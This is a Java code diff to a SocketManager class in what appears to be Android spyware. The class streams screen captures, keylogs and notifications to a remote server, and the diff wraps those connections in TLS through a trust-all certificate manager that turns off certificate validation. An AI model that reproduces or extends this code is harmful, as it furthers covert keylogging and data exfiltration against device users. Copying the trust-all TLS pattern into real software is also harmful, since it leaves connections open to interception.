@@ -18,6 +18,12 @@ import java.io.ByteArrayOutputStream;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLSocket;
+import javax.net.ssl.SSLSocketFactory;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
+import java.security.cert.X509Certificate;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
@@ -182,6 +188,23 @@ public class SocketManager {
     /** Whether streaming is currently active (idle-frame mode on). */
     public boolean isStreamingActive() { return idleFrameMode && connected; }
 
+    /** Build an SSLSocketFactory that trusts all certificates (self-signed or CA). */
+    private static SSLSocketFactory buildTrustAllFactory() {
+        try {
+            TrustManager[] trustAll = new TrustManager[]{ new X509TrustManager() {
+                public void checkClientTrusted(X509Certificate[] c, String a) {}
+                public void checkServerTrusted(X509Certificate[] c, String a) {}
+                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
+            }};
+            SSLContext sc = SSLContext.getInstance("TLS");
+            sc.init(null, trustAll, new java.security.SecureRandom());
+            return sc.getSocketFactory();
+        } catch (Exception e) {
+            Log.e("SocketManager", "buildTrustAllFactory failed: " + e.getMessage());
+            return (SSLSocketFactory) SSLSocketFactory.getDefault();
+        }
+    }
+
     /**
      * Schedule a frame capture 200 ms after the last device-user interaction.
      * Resets the timer on each call so rapid interactions produce only one frame.
@@ -219,8 +242,12 @@ public class SocketManager {
     private void connectionLoop() {
         while (running) {
             try {
-                Log.i(TAG, "Connecting to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
-                tcpSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
+                Log.i(TAG, "Connecting (TLS) to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
+                SSLSocketFactory tlsFactory = buildTrustAllFactory();
+                SSLSocket sslSock = (SSLSocket) tlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
+                sslSock.setUseClientMode(true);
+                sslSock.startHandshake();
+                tcpSocket = sslSock;
                 tcpSocket.setKeepAlive(true);
                 tcpSocket.setTcpNoDelay(true);
                 tcpSocket.setSoTimeout(0);
@@ -268,7 +295,11 @@ public class SocketManager {
                 continue;
             }
             try {
-                streamSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
+                SSLSocketFactory streamTlsFactory = buildTrustAllFactory();
+                SSLSocket streamSsl = (SSLSocket) streamTlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
+                streamSsl.setUseClientMode(true);
+                streamSsl.startHandshake();
+                streamSocket = streamSsl;
                 streamSocket.setKeepAlive(true);
                 streamSocket.setTcpNoDelay(true);        // disable Nagle — send frames immediately
                 streamSocket.setSendBufferSize(131072);  // 128 KB send buffer — frames fit in one flush
@@ -384,7 +415,11 @@ public class SocketManager {
                 continue;
             }
             try {
-                liveSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
+                SSLSocketFactory liveTlsFactory = buildTrustAllFactory();
+                SSLSocket liveSsl = (SSLSocket) liveTlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
+                liveSsl.setUseClientMode(true);
+                liveSsl.startHandshake();
+                liveSocket = liveSsl;
                 liveSocket.setKeepAlive(true);
                 liveSocket.setTcpNoDelay(true);       // disable Nagle — keylog/notif sent immediately
                 liveSocket.setSendBufferSize(65536);  // 64 KB — ample for keylog/notif payloads
